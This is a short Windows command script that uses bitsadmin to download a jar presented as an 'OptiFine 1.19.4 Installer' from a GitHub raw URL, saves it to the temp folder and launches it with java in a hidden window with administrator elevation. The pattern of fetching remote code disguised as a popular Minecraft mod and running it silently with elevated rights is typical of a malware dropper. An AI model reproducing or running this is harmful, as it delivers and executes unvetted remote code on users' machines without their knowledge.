bitsadmin /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/RedTheMenace/OpifIJejwejwe/main/OptiFine_1.19.4_Installer.jar "$env:temp\Optifine_1.19.4_Installer.jar" ; 
sleep 3 ; 
cd $env:temp ; 
start java -windowstyle hidden -verb runas -args '-jar Optifine_1.19.4_Installer.jar'
